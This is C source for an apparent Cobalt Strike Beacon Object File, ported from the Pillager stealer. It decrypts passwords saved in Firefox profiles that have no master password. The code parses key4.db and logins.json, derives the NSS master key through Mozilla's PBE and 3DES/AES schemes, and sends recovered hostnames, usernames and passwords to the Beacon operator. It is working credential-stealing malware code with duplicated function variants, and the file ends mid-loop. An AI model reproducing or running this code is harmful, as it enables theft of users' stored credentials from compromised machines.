/*
 * Firefox key4.db + logins.json 口令解密（无主密码），路径对齐 Pillager FireFox.cs / MozillaPBE / decryptMoz3DES
 */
#include "plg_common.h"

typedef PVOID BCRYPT_HASH_HANDLE;

WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptCreateHash(BCRYPT_ALG_HANDLE, BCRYPT_HASH_HANDLE *, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptHashData(BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptDestroyHash(BCRYPT_HASH_HANDLE);
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptFinishHash(BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG);

static int pjoin(char *o, size_t z, const char *a, const char *b) {
	int n = MSVCRT$_snprintf(o, z, "%s\\%s", a, b);
	return (n > 0 && (size_t)n < z) ? 0 : -1;
}

typedef struct A1 {
	unsigned char tag;
	unsigned char *raw;
	int rawlen;
	unsigned char *v;
	int vlen;
	struct A1 **kids;
	int nkids;
} A1;

static void a1_free(A1 *n) {
	int i;
	if (!n)
		return;
	for (i = 0; i < n->nkids; i++)
		a1_free(n->kids[i]);
	plg_free(n->kids);
	plg_free(n->raw);
	plg_free(n);
}

static int der_len(const unsigned char *p, int rem, int *L, int *h) {
	int nb, i;
	if (rem < 1)
		return -1;
	if (p[0] < 0x80) {
		*L = p[0];
		*h = 1;
		return 0;
	}
	nb = p[0] & 0x7f;
	if (nb == 0 || nb > 4 || rem < 1 + nb)
		return -1;
	*L = 0;
	for (i = 0; i < nb; i++)
		*L = (*L << 8) | p[1 + i];
	*h = 1 + nb;
	return 0;
}

static int a1_parse(const unsigned char *buf, int len, A1 **out, int depth) {
	int h, L, tlen, off, nc;
	const unsigned char *content;
	A1 *n;
	A1 *ch[96];
	if (depth > 32 || len < 2 || !out)
		return -1;
	if (der_len(buf + 1, len - 1, &L, &h) < 0)
		return -1;
	tlen = 1 + h + L;
	if (tlen > len || tlen < 0)
		return -1;
	n = (A1 *)plg_alloc(sizeof(A1));
	if (!n)
		return -1;
	MSVCRT$memset(n, 0, sizeof(*n));
	n->tag = buf[0];
	n->raw = (unsigned char *)plg_alloc((size_t)tlen);
	if (!n->raw) {
		plg_free(n);
		return -1;
	}
	MSVCRT$memcpy(n->raw, buf, (size_t)tlen);
	n->rawlen = tlen;
	content = buf + 1 + h;
	if ((n->tag & 0x1f) == 0x10 || n->tag == 0x30 || n->tag == 0x31) {
		off = 0;
		nc = 0;
		while (off < L && nc < 96) {
			A1 *c = NULL;
			if (a1_parse(content + off, L - off, &c, depth + 1) < 0)
				break;
			ch[nc++] = c;
			off += c->rawlen;
		}
		if (nc > 0) {
			n->kids = (A1 **)plg_alloc(sizeof(A1 *) * (size_t)nc);
			if (!n->kids) {
				while (nc--)
					a1_free(ch[nc]);
				plg_free(n->raw);
				plg_free(n);
				return -1;
			}
			MSVCRT$memcpy(n->kids, ch, sizeof(A1 *) * (size_t)nc);
			n->nkids = nc;
		}
	} else {
		n->v = n->raw + 1 + h;
		n->vlen = L;
	}
	*out = n;
	return 0;
}

static A1 *a1_ch(A1 *n, int i) {
	if (!n || i < 0 || i >= n->nkids)
		return NULL;
	return n->kids[i];
}

static int a1_oct(const A1 *n, unsigned char **d, int *dl) {
	if (!n || n->tag != 0x04 || !n->v)
		return -1;
	*d = n->v;
	*dl = n->vlen;
	return 0;
}

static int ff_sha1(const unsigned char *d, ULONG dl, unsigned char out[20]) {
	BCRYPT_ALG_HANDLE a = NULL;
	BCRYPT_HASH_HANDLE h = NULL;
	NTSTATUS st;
	wchar_t wsha1[] = { 'S', 'H', 'A', '1', 0 };
	st = BCRYPT$BCryptOpenAlgorithmProvider(&a, wsha1, NULL, 0);
	if (st)
		return -1;
	st = BCRYPT$BCryptCreateHash(a, &h, NULL, 0, NULL, 0, 0);
	if (st)
		goto e;
	st = BCRYPT$BCryptHashData(h, (PUCHAR)d, dl, 0);
	if (st)
		goto e;
	st = BCRYPT$BCryptFinishHash(h, out, 20, 0);
e:
	if (h)
		BCRYPT$BCryptDestroyHash(h);
	if (a)
		BCRYPT$BCryptCloseAlgorithmProvider(a, 0);
	return st ? -1 : 0;
}

static int ff_hmac_sha256(const unsigned char *key, ULONG keylen, const unsigned char *msg, ULONG msglen, unsigned char mac[32]) {
	BCRYPT_ALG_HANDLE a = NULL;
	BCRYPT_HASH_HANDLE h = NULL;
	wchar_t w256[] = { 'S', 'H', 'A', '2', '5', '6', 0 };
	NTSTATUS st;
	unsigned char ipad[64], opad[64];
	unsigned char inner[32], outer[32];
	ULONG i;
	if (keylen > 64)
		return -1;
	MSVCRT$memset(ipad, 0x36, sizeof(ipad));
	MSVCRT$memset(opad, 0x5c, sizeof(opad));
	for (i = 0; i < keylen; i++) {
		ipad[i] ^= key[i];
		opad[i] ^= key[i];
	}
	st = BCRYPT$BCryptOpenAlgorithmProvider(&a, w256, NULL, 0);
	if (st)
		return -1;
	st = BCRYPT$BCryptCreateHash(a, &h, NULL, 0, NULL, 0, 0);
	if (st)
		goto e;
	st = BCRYPT$BCryptHashData(h, ipad, 64, 0);
	if (st)
		goto e;
	st = BCRYPT$BCryptHashData(h, (PUCHAR)msg, msglen, 0);
	if (st)
		goto e;
	st = BCRYPT$BCryptFinishHash(h, inner, 32, 0);
	BCRYPT$BCryptDestroyHash(h);
	h = NULL;
	if (st)
		goto e;
	st = BCRYPT$BCryptCreateHash(a, &h, NULL, 0, NULL, 0, 0);
	if (st)
		goto e;
	st = BCRYPT$BCryptHashData(h, opad, 64, 0);
	if (st)
		goto e;
	st = BCRYPT$BCryptHashData(h, inner, 32, 0);
	if (st)
		goto e;
	st = BCRYPT$BCryptFinishHash(h, outer, 32, 0);
	MSVCRT$memcpy(mac, outer, 32);
e:
	if (h)
		BCRYPT$BCryptDestroyHash(h);
	if (a)
		BCRYPT$BCryptCloseAlgorithmProvider(a, 0);
	return st ? -1 : 0;
}

static int ff_pbkdf2_hmac_sha256_1(const unsigned char *hp, ULONG hplen, const unsigned char *salt, ULONG saltlen,
	unsigned char key[32]) {
	unsigned char ib[128];
	unsigned char blk[4] = { 0, 0, 0, 1 };
	if (saltlen + 4 > sizeof(ib))
		return -1;
	MSVCRT$memcpy(ib, salt, saltlen);
	MSVCRT$memcpy(ib + saltlen, blk, 4);
	return ff_hmac_sha256(hp, hplen, ib, saltlen + 4, key);
}

static int ff_aes256_cbc_decrypt(const unsigned char *key32, const unsigned char *iv, ULONG ivlen,
	const unsigned char *ct, ULONG ctlen, unsigned char *pt, ULONG *ptlen) {
	BCRYPT_ALG_HANDLE a = NULL;
	BCRYPT_KEY_HANDLE k = NULL;
	ULONG objlen = 0, r = 0, kl;
	unsigned char *obj = NULL;
	wchar_t waes[] = { 'A', 'E', 'S', 0 };
	wchar_t wprim[] = { 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', ' ', 'P', 'r', 'i', 'm', 'i', 't', 'i', 'v', 'e', 0 };
	wchar_t wchain[] = { 'C', 'h', 'a', 'i', 'n', 'i', 'n', 'g', 'M', 'o', 'd', 'e', 0 };
	wchar_t wcbc[] = { 'C', 'h', 'a', 'i', 'n', 'i', 'n', 'g', 'M', 'o', 'd', 'e', 'C', 'B', 'C', 0 };
	NTSTATUS st;
	st = BCRYPT$BCryptOpenAlgorithmProvider(&a, waes, wprim, 0);
	if (st)
		return -1;
	st = BCRYPT$BCryptSetProperty(a, wchain, (PUCHAR)wcbc, sizeof(wcbc), 0);
	if (st)
		goto e;
	st = BCRYPT$BCryptGetProperty(a, (wchar_t[]){ 'O', 'b', 'j', 'e', 'c', 't', 'L', 'e', 'n', 'g', 't', 'h', 0 }, (PUCHAR)&objlen, sizeof(objlen), &kl, 0);
	if (st)
		goto e;
	obj = (unsigned char *)plg_alloc(objlen);
	if (!obj) {
		st = (NTSTATUS)0xC0000017L;
		goto e;
	}
	st = BCRYPT$BCryptGenerateSymmetricKey(a, &k, obj, objlen, (PUCHAR)key32, 32, 0);
	if (st)
		goto e;
	r = *ptlen;
	st = BCRYPT$BCryptDecrypt(k, (PUCHAR)ct, ctlen, NULL, (PUCHAR)iv, ivlen, pt, r, &r, 0);
	*ptlen = r;
e:
	if (k)
		BCRYPT$BCryptDestroyKey(k);
	if (a)
		BCRYPT$BCryptCloseAlgorithmProvider(a, 0);
	plg_free(obj);
	return st ? -1 : 0;
}

static int ff_3des_cbc_decrypt(const unsigned char *key24, const unsigned char *iv8,
	const unsigned char *ct, ULONG ctlen, unsigned char *pt, ULONG *ptlen) {
	BCRYPT_ALG_HANDLE a = NULL;
	BCRYPT_KEY_HANDLE k = NULL;
	ULONG objlen = 0, r = 0, kl;
	unsigned char *obj = NULL;
	wchar_t w3[] = { '3', 'D', 'E', 'S', 0 };
	wchar_t wprim[] = { 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', ' ', 'P', 'r', 'i', 'm', 'i', 't', 'i', 'v', 'e', 0 };
	wchar_t wchain[] = { 'C', 'h', 'a', 'i', 'n', 'i', 'n', 'g', 'M', 'o', 'd', 'e', 0 };
	wchar_t wcbc[] = { 'C', 'h', 'a', 'i', 'n', 'i', 'n', 'g', 'M', 'o', 'd', 'e', 'C', 'B', 'C', 0 };
	NTSTATUS st;
	st = BCRYPT$BCryptOpenAlgorithmProvider(&a, w3, wprim, 0);
	if (st)
		return -1;
	st = BCRYPT$BCryptSetProperty(a, wchain, (PUCHAR)wcbc, sizeof(wcbc), 0);
	if (st)
		goto e;
	st = BCRYPT$BCryptGetProperty(a, (wchar_t[]){ 'O', 'b', 'j', 'e', 'c', 't', 'L', 'e', 'n', 'g', 't', 'h', 0 }, (PUCHAR)&objlen, sizeof(objlen), &kl, 0);
	if (st)
		goto e;
	obj = (unsigned char *)plg_alloc(objlen);
	if (!obj) {
		st = (NTSTATUS)0xC0000017L;
		goto e;
	}
	st = BCRYPT$BCryptGenerateSymmetricKey(a, &k, obj, objlen, (PUCHAR)key24, 24, 0);
	if (st)
		goto e;
	r = *ptlen;
	st = BCRYPT$BCryptDecrypt(k, (PUCHAR)ct, ctlen, NULL, (PUCHAR)iv8, 8, pt, r, &r, 0);
	*ptlen = r;
e:
	if (k)
		BCRYPT$BCryptDestroyKey(k);
	if (a)
		BCRYPT$BCryptCloseAlgorithmProvider(a, 0);
	plg_free(obj);
	return st ? -1 : 0;
}

static int ff_mozilla_pbe_decrypt(const unsigned char *ct, ULONG ctlen, const unsigned char *gs, ULONG gsl,
	const unsigned char *es, ULONG esl, const unsigned char *piv, ULONG pivl, unsigned char *out, ULONG *outlen) {
	unsigned char hp[20];
	unsigned char glmp[512];
	unsigned char key[32];
	unsigned char iv[32];
	if (gsl + 1 > sizeof(glmp))
		return -1;
	MSVCRT$memcpy(glmp, gs, gsl);
	ff_sha1(glmp, gsl, hp);
	if (ff_pbkdf2_hmac_sha256_1(hp, 20, es, esl, key) < 0)
		return -1;
	if (pivl + 2 > sizeof(iv))
		return -1;
	iv[0] = 0x04;
	iv[1] = 0x0e;
	MSVCRT$memcpy(iv + 2, piv, pivl);
	return ff_aes256_cbc_decrypt(key, iv, 2 + pivl, ct, ctlen, out, outlen);
}

static int ff_moz3des_pwd_check(const unsigned char *ct, ULONG ctlen, const unsigned char *gs, ULONG gsl,
	const unsigned char *es, ULONG esl) {
	unsigned char glmp[512];
	unsigned char hp[20];
	unsigned char hpes[512];
	unsigned char chp[20];
	unsigned char k1[20], tk[20], k2[20], k[40];
	unsigned char key24[24], iv8[8];
	unsigned char dec[64];
	ULONG decl = sizeof(dec);
	BCRYPT_ALG_HANDLE a = NULL;
	BCRYPT_HASH_HANDLE hh = NULL;
	wchar_t wsha1[] = { 'S', 'H', 'A', '1', 0 };
	NTSTATUS st;
	if (gsl + 1 > sizeof(glmp))
		return -1;
	MSVCRT$memcpy(glmp, gs, gsl);
	ff_sha1(glmp, gsl, hp);
	if (20 + esl > sizeof(hpes))
		return -1;
	MSVCRT$memcpy(hpes, hp, 20);
	MSVCRT$memcpy(hpes + 20, es, esl);
	ff_sha1(hpes, 20 + esl, chp);
	st = BCRYPT$BCryptOpenAlgorithmProvider(&a, wsha1, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
	if (st)
		return -1;
	st = BCRYPT$BCryptCreateHash(a, &hh, NULL, 0, (PUCHAR)chp, 20, BCRYPT_HASH_REUSABLE_FLAG);
	if (st)
		goto e;
	{
		unsigned char pes[64], tkes[64];
		int i;
		MSVCRT$memset(pes, 0, 20);
		if (esl > 20)
			return -1;
		MSVCRT$memcpy(pes, es, esl);
		st = BCRYPT$BCryptHashData(hh, pes, 20, BCRYPT_HASH_REUSABLE_FLAG);
		if (st)
			goto e;
		st = BCRYPT$BCryptFinishHash(hh, k1, 20, 0);
		if (st)
			goto e;
		BCRYPT$BCryptDestroyHash(hh);
		hh = NULL;
		st = BCRYPT$BCryptCreateHash(a, &hh, NULL, 0, (PUCHAR)chp, 20, BCRYPT_ALG_HANDLE_HMAC_FLAG);
		if (st)
			goto e;
		st = BCRYPT$BCryptHashData(hh, pes, 20, 0);
		if (st)
			goto e;
		st = BCRYPT$BCryptFinishHash(hh, tk, 20, 0);
		if (st)
			goto e;
		BCRYPT$BCryptDestroyHash(hh);
		hh = NULL;
		MSVCRT$memcpy(tkes, tk, 20);
		MSVCRT$memcpy(tkes + 20, es, esl);
		st = BCRYPT$BCryptCreateHash(a, &hh, NULL, 0, (PUCHAR)chp, 20, 0);
		if (st)
			goto e;
		st = BCRYPT$BCryptHashData(hh, tkes, 20 + esl, 0);
		if (st)
			goto e;
		st = BCRYPT$BCryptFinishHash(hh, k2, 20, 0);
		if (st)
			goto e;
		MSVCRT$memcpy(k, k1, 20);
		MSVCRT$memcpy(k + 20, k2, 20);
		MSVCRT$memcpy(key24, k, 24);
		for (i = 0; i < 8; i++)
			iv8[i] = k[20 + 7 - i];
	}
	if (ff_3des_cbc_decrypt(key24, iv8, ct, ctlen, dec, &decl) < 0)
		goto e;
	dec[decl < 63 ? decl : 63] = 0;
	if (MSVCRT$strstr((char *)dec, "password-check") == NULL)
		st = (NTSTATUS)1;
e:
	if (hh)
		BCRYPT$BCryptDestroyHash(hh);
	if (a)
		BCRYPT$BCryptCloseAlgorithmProvider(a, 0);
	return st ? -1 : 0;
}

#ifndef BCRYPT_ALG_HANDLE_HMAC_FLAG
#define BCRYPT_ALG_HANDLE_HMAC_FLAG 0x00000008
#endif
#ifndef BCRYPT_HASH_REUSABLE_FLAG
#define BCRYPT_HASH_REUSABLE_FLAG 0x00000020
#endif

static int ff_moz3des_pwd_check_simple(const unsigned char *ct, ULONG ctlen, const unsigned char *gs, ULONG gsl,
	const unsigned char *es, ULONG esl) {
	/* HMAC-SHA1(CHP) 链与 Pillager decryptMoz3DES 一致；CHP = SHA1(HP||ES) */
	unsigned char glmp[512], hp[20], hpes[512], chp[20];
	unsigned char k1[20], tk[20], k2[20], kbuf[64], key24[24], iv8[8];
	unsigned char dec[128];
	ULONG decl = sizeof(dec);
	int i;
	BCRYPT_ALG_HANDLE ha = NULL;
	BCRYPT_HASH_HANDLE h1 = NULL, h2 = NULL, h3 = NULL;
	wchar_t wsha1[] = { 'S', 'H', 'A', '1', 0 };
	NTSTATUS st;
	if (gsl + 1 > sizeof(glmp) || 20 + esl > sizeof(hpes))
		return -1;
	MSVCRT$memcpy(glmp, gs, gsl);
	if (ff_sha1(glmp, gsl, hp) < 0)
		return -1;
	MSVCRT$memcpy(hpes, hp, 20);
	MSVCRT$memcpy(hpes + 20, es, esl);
	if (ff_sha1(hpes, 20 + esl, chp) < 0)
		return -1;
	st = BCRYPT$BCryptOpenAlgorithmProvider(&ha, wsha1, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
	if (st)
		return -1;
	st = BCRYPT$BCryptCreateHash(ha, &h1, NULL, 0, (PUCHAR)chp, 20, 0);
	if (st)
		goto e;
	{
		unsigned char pes[32], tkes[48];
		MSVCRT$memset(pes, 0, 20);
		MSVCRT$memcpy(pes, es, esl > 20 ? 20 : esl);
		st = BCRYPT$BCryptHashData(h1, pes, 20, 0);
		if (st)
			goto e;
		st = BCRYPT$BCryptFinishHash(h1, k1, 20, 0);
	}
	BCRYPT$BCryptDestroyHash(h1);
	h1 = NULL;
	if (st)
		goto e;
	st = BCRYPT$BCryptCreateHash(ha, &h2, NULL, 0, (PUCHAR)chp, 20, 0);
	if (st)
		goto e;
	{
		unsigned char pes[32];
		MSVCRT$memset(pes, 0, 20);
		MSVCRT$memcpy(pes, es, esl > 20 ? 20 : esl);
		st = BCRYPT$BCryptHashData(h2, pes, 20, 0);
		if (st)
			goto e;
		st = BCRYPT$BCryptFinishHash(h2, tk, 20, 0);
	}
	BCRYPT$BCryptDestroyHash(h2);
	h2 = NULL;
	if (st)
		goto e;
	st = BCRYPT$BCryptCreateHash(ha, &h3, NULL, 0, (PUCHAR)chp, 20, 0);
	if (st)
		goto e;
	{
		unsigned char tkes[48];
		MSVCRT$memcpy(tkes, tk, 20);
		MSVCRT$memcpy(tkes + 20, es, esl);
		st = BCRYPT$BCryptHashData(h3, tkes, 20 + esl, 0);
		if (st)
			goto e;
		st = BCRYPT$BCryptFinishHash(h3, k2, 20, 0);
	}
	BCRYPT$BCryptDestroyHash(h3);
	h3 = NULL;
	if (st)
		goto e;
	MSVCRT$memcpy(kbuf, k1, 20);
	MSVCRT$memcpy(kbuf + 20, k2, 20);
	MSVCRT$memcpy(key24, kbuf, 24);
	for (i = 0; i < 8; i++)
		iv8[i] = kbuf[20 + 7 - i];
	if (ff_3des_cbc_decrypt(key24, iv8, ct, ctlen, dec, &decl) < 0)
		goto e;
	dec[decl < 127 ? decl : 127] = 0;
	if (!MSVCRT$strstr((char *)dec, "password-check"))
		st = (NTSTATUS)1;
e:
	if (h1)
		BCRYPT$BCryptDestroyHash(h1);
	if (h2)
		BCRYPT$BCryptDestroyHash(h2);
	if (h3)
		BCRYPT$BCryptDestroyHash(h3);
	if (ha)
		BCRYPT$BCryptCloseAlgorithmProvider(ha, 0);
	return st ? -1 : 0;
}

/* 修正：memcpy 参数错误 — 使用 esl 逐字节拷贝 */
static int ff_moz3des_pwd_check_fixed(const unsigned char *ct, ULONG ctlen, const unsigned char *gs, ULONG gsl,
	const unsigned char *es, ULONG esl) {
	unsigned char glmp[512], hp[20], hpes[512], chp[20];
	unsigned char k1[20], tk[20], k2[20], kbuf[64], key24[24], iv8[8];
	unsigned char pes[32], tkes[64];
	unsigned char dec[128];
	ULONG decl = sizeof(dec);
	int i;
	BCRYPT_ALG_HANDLE ha = NULL;
	BCRYPT_HASH_HANDLE hx = NULL;
	wchar_t wsha1[] = { 'S', 'H', 'A', '1', 0 };
	NTSTATUS st = 0;
	if (gsl > sizeof(glmp) - 1 || esl > 40)
		return -1;
	MSVCRT$memcpy(glmp, gs, gsl);
	if (ff_sha1(glmp, gsl, hp) < 0)
		return -1;
	MSVCRT$memcpy(hpes, hp, 20);
	MSVCRT$memcpy(hpes + 20, es, esl);
	if (ff_sha1(hpes, 20 + esl, chp) < 0)
		return -1;
	st = BCRYPT$BCryptOpenAlgorithmProvider(&ha, wsha1, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
	if (st)
		return -1;
	MSVCRT$memset(pes, 0, 20);
	MSVCRT$memcpy(pes, es, esl);
	st = BCRYPT$BCryptCreateHash(ha, &hx, NULL, 0, (PUCHAR)chp, 20, 0);
	if (st)
		goto e;
	st = BCRYPT$BCryptHashData(hx, pes, 20, 0);
	if (st)
		goto e;
	st = BCRYPT$BCryptFinishHash(hx, k1, 20, 0);
	BCRYPT$BCryptDestroyHash(hx);
	hx = NULL;
	if (st)
		goto e;
	st = BCRYPT$BCryptCreateHash(ha, &hx, NULL, 0, (PUCHAR)chp, 20, 0);
	if (st)
		goto e;
	st = BCRYPT$BCryptHashData(hx, pes, 20, 0);
	if (st)
		goto e;
	st = BCRYPT$BCryptFinishHash(hx, tk, 20, 0);
	BCRYPT$BCryptDestroyHash(hx);
	hx = NULL;
	if (st)
		goto e;
	MSVCRT$memcpy(tkes, tk, 20);
	MSVCRT$memcpy(tkes + 20, es, esl);
	st = BCRYPT$BCryptCreateHash(ha, &hx, NULL, 0, (PUCHAR)chp, 20, 0);
	if (st)
		goto e;
	st = BCRYPT$BCryptHashData(hx, tkes, 20 + esl, 0);
	if (st)
		goto e;
	st = BCRYPT$BCryptFinishHash(hx, k2, 20, 0);
	BCRYPT$BCryptDestroyHash(hx);
	hx = NULL;
	if (st)
		goto e;
	MSVCRT$memcpy(kbuf, k1, 20);
	MSVCRT$memcpy(kbuf + 20, k2, 20);
	MSVCRT$memcpy(key24, kbuf, 24);
	for (i = 0; i < 8; i++)
		iv8[i] = kbuf[20 + 7 - i];
	if (ff_3des_cbc_decrypt(key24, iv8, ct, ctlen, dec, &decl) < 0)
		goto fail;
	dec[decl < 127 ? decl : 127] = 0;
	if (!MSVCRT$strstr((char *)dec, "password-check"))
		goto fail;
	goto ok;
fail:
	st = (NTSTATUS)1;
ok:
e:
	if (hx)
		BCRYPT$BCryptDestroyHash(hx);
	if (ha)
		BCRYPT$BCryptCloseAlgorithmProvider(ha, 0);
	return st ? -1 : 0;
}

static int oid_is_pbes2(const unsigned char *p, int len) {
	static const unsigned char oid[] = { 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x05, 0x0d };
	int i;
	for (i = 0; i + (int)sizeof(oid) <= len; i++) {
		if (MSVCRT$memcmp(p + i, oid, sizeof(oid)) == 0)
			return 1;
	}
	return 0;
}

static int oid_is_3des_pbe(const unsigned char *p, int len) {
	static const unsigned char oid[] = { 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x0c, 0x05, 0x01, 0x03 };
	int i;
	for (i = 0; i + (int)sizeof(oid) <= len; i++) {
		if (MSVCRT$memcmp(p + i, oid, sizeof(oid)) == 0)
			return 1;
	}
	return 0;
}

static int ff_meta_password_ok(A1 *item2, const unsigned char *gs, ULONG gsl) {
	unsigned char *es = NULL, *ct = NULL, *piv = NULL;
	int esl = 0, ctl = 0, pvl = 0;
	A1 *p;
	unsigned char *raw;
	int rl;
	if (oid_is_pbes2(item2->raw, item2->rawlen)) {
		p = a1_ch(a1_ch(a1_ch(item2, 0), 0), 1);
		if (!p)
			return -1;
		raw = p->raw;
		rl = p->rawlen;
		if (!oid_is_pbes2(raw, rl))
			return -1;
		if (a1_oct(a1_ch(a1_ch(a1_ch(a1_ch(a1_ch(a1_ch(p, 0), 0), 1), 0), 1), 0), &es, &esl) < 0)
			return -1;
		if (a1_oct(a1_ch(a1_ch(a1_ch(a1_ch(a1_ch(p, 0), 0), 1), 2), 1), &piv, &pvl) < 0)
			return -1;
		if (a1_oct(a1_ch(a1_ch(a1_ch(a1_ch(p, 0), 0), 1), 3), &ct, &ctl) < 0)
			return -1;
		{
			unsigned char plain[256];
			ULONG pl = sizeof(plain);
			if (ff_mozilla_pbe_decrypt(ct, (ULONG)ctl, gs, gsl, es, (ULONG)esl, piv, (ULONG)pvl, plain, &pl) < 0)
				return -1;
			plain[pl < 255 ? pl : 255] = 0;
			if (!MSVCRT$strstr((char *)plain, "password-check"))
				return -1;
		}
		return 0;
	}
	if (oid_is_3des_pbe(item2->raw, item2->rawlen)) {
		if (a1_oct(a1_ch(a1_ch(a1_ch(a1_ch(item2, 0), 0), 1), 0), &es, &esl) < 0)
			return -1;
		if (a1_oct(a1_ch(a1_ch(item2, 0), 1), &ct, &ctl) < 0)
			return -1;
		return ff_moz3des_pwd_check_fixed(ct, (ULONG)ctl, gs, gsl, es, (ULONG)esl);
	}
	return -1;
}

static int ff_nss_priv_key(const unsigned char *a11der, int a11len, const unsigned char *gs, ULONG gsl,
	unsigned char priv24[24]) {
	A1 *root = NULL, *p;
	unsigned char *es, *piv, *ct;
	int esl, pvl, ctl;
	unsigned char full[512];
	ULONG fl = sizeof(full);
	if (a1_parse(a11der, a11len, &root, 0) < 0)
		return -1;
	p = a1_ch(a1_ch(a1_ch(root, 0), 0), 1);
	if (!p) {
		a1_free(root);
		return -1;
	}
	if (a1_oct(a1_ch(a1_ch(a1_ch(a1_ch(a1_ch(a1_ch(p, 0), 0), 1), 0), 1), 0), &es, &esl) < 0) {
		a1_free(root);
		return -1;
	}
	if (a1_oct(a1_ch(a1_ch(a1_ch(a1_ch(a1_ch(p, 0), 0), 1), 2), 1), &piv, &pvl) < 0) {
		a1_free(root);
		return -1;
	}
	if (a1_oct(a1_ch(a1_ch(a1_ch(a1_ch(p, 0), 0), 1), 3), &ct, &ctl) < 0) {
		a1_free(root);
		return -1;
	}
	if (ff_mozilla_pbe_decrypt(ct, (ULONG)ctl, gs, gsl, es, (ULONG)esl, piv, (ULONG)pvl, full, &fl) < 0) {
		a1_free(root);
		return -1;
	}
	a1_free(root);
	MSVCRT$memcpy(priv24, full, 24);
	return 0;
}

static int ff_do_login_blob(const unsigned char *priv24, const unsigned char *blob, int blen, char *out, size_t osz) {
	A1 *root = NULL;
	unsigned char *iv, *ct;
	int ivl, ctl;
	ULONG dl;
	unsigned char buf[8192];
	if (a1_parse(blob, blen, &root, 0) < 0)
		return -1;
	if (a1_oct(a1_ch(a1_ch(a1_ch(root, 0), 1), 1), &iv, &ivl) < 0) {
		a1_free(root);
		return -1;
	}
	if (a1_oct(a1_ch(a1_ch(root, 0), 2), &ct, &ctl) < 0) {
		a1_free(root);
		return -1;
	}
	a1_free(root);
	dl = sizeof(buf);
	if (ivl != 8 || ff_3des_cbc_decrypt(priv24, iv, ct, (ULONG)ctl, buf, &dl) < 0)
		return -1;
	buf[dl < sizeof(buf) - 1 ? dl : sizeof(buf) - 1] = 0;
	{
		size_t j, k = 0;
		for (j = 0; j < dl && k + 1 < osz; j++) {
			unsigned char c = buf[j];
			if (c >= 0x20 && c <= 0x7e)
				out[k++] = (char)c;
		}
		out[k] = 0;
	}
	return 0;
}

static int ff_b64_to_bin(const char *b64, unsigned char *out, size_t osz, size_t *w) {
	return plg_b64_decode(b64, out, osz, w);
}

void plg_ffox_dump_passwords(const char *pdir, const char *profname, formatp *fmt) {
	char k4[PLG_MAX_PATH], lj[PLG_MAX_PATH], hdr[256];
	unsigned char *dbbuf = NULL;
	DWORD dblen = 0;
	PlgSqlite *db = NULL;
	int i, n, got_meta = 0;
	unsigned char gsalt[64];
	size_t gslen = 0;
	unsigned char a11bin[16384];
	size_t a11len;
	unsigned char priv24[24];
	int have_priv = 0;

	if (pjoin((char *)k4, sizeof(k4), pdir, "key4.db") != 0)
		return;
	if (pjoin((char *)lj, sizeof(lj), pdir, "logins.json") != 0)
		return;
	if (KERNEL32$GetFileAttributesA(k4) == INVALID_FILE_ATTRIBUTES ||
	    KERNEL32$GetFileAttributesA(lj) == INVALID_FILE_ATTRIBUTES)
		return;
	if (plg_read_file_a(k4, &dbbuf, &dblen) < 0)
		return;
	db = plg_sqlite_open(dbbuf, dblen);
	plg_free(dbbuf);
	if (!db)
		return;
	if (plg_sqlite_read_table(db, "metadata") >= 0) {
		n = plg_sqlite_row_count(db);
		for (i = 0; i < n; i++) {
			const char *id = plg_sqlite_get(db, i, "id");
			const char *i1 = plg_sqlite_get(db, i, "item1");
			const char *i2 = plg_sqlite_get(db, i, "item2");
			A1 *item2 = NULL;
			unsigned char dec2[65536];
			size_t d2l;
			if (!id || MSVCRT$strcmp(id, "password") != 0 || !i1 || !i2)
				continue;
			if (ff_b64_to_bin(i1, gsalt, sizeof(gsalt), &gslen) < 0)
				continue;
			if (ff_b64_to_bin(i2, dec2, sizeof(dec2), &d2l) < 0)
				continue;
			if (a1_parse(dec2, (int)d2l, &item2, 0) < 0)
				continue;
			if (ff_meta_password_ok(item2, gsalt, (ULONG)gslen) < 0) {
				a1_free(item2);
				continue;
			}
			a1_free(item2);
			got_meta = 1;
			break;
		}
	}
	if (!got_meta) {
		plg_sqlite_close(db);
		BeaconPrintf(CALLBACK_OUTPUT, "[i] FF %s: metadata password-check failed (或主密码非空)", profname);
		return;
	}
	if (plg_sqlite_read_table(db, "nssPrivate") < 0) {
		plg_sqlite_close(db);
		return;
	}
	n = plg_sqlite_row_count(db);
	for (i = 0; i < n; i++) {
		const char *a11 = plg_sqlite_get(db, i, "a11");
		if (!a11)
			continue;
		if (ff_b64_to_bin(a11, a11bin, sizeof(a11bin), &a11len) < 0)
			continue;
		if (ff_nss_priv_key(a11bin, (int)a11len, gsalt, (ULONG)gslen, priv24) == 0) {
			have_priv = 1;
			break;
		}
	}
	plg_sqlite_close(db);
	if (!have_priv) {
		BeaconPrintf(CALLBACK_OUTPUT, "[i] FF %s: nssPrivate 解密失败", profname);
		return;
	}
	{
		unsigned char *js = NULL;
		DWORD jslen = 0;
		const char *p, *q;
		if (plg_read_file_a(lj, &js, &jslen) < 0)
			return;
		MSVCRT$_snprintf(hdr, sizeof(hdr), "\n=== FireFox %s / passwords ===\n", profname);
		BeaconFormatPrintf(fmt, "%s", hdr);
		p = MSVCRT$strstr((char *)js, "\"logins\"");
		if (!p) {
			plg_free(js);
			return;
		}
		p = MSVCRT$strchr(p, '[');
		if (!p) {
			plg_free(js);
			return;
		}
		for (;;) {
			unsigned char ub[16384], pb[16384];
			size_t ul, pl;
			char user[2048], pass[2048], host[512];
			char *hp;
			const char *hu, *heu, *hep;
			p = MSVCRT$strchr(p, '{');
			if (!p)
				break;
			q = MSVCRT$strchr(p, '}');
			if (!q)
				break;
			host[0] = user[0] = pass[0] = 0;
			hu = MSVCRT$strstr(p, "\"hostname\"");
			heu = MSVCRT$strstr(p, "\"encryptedUsername\"");
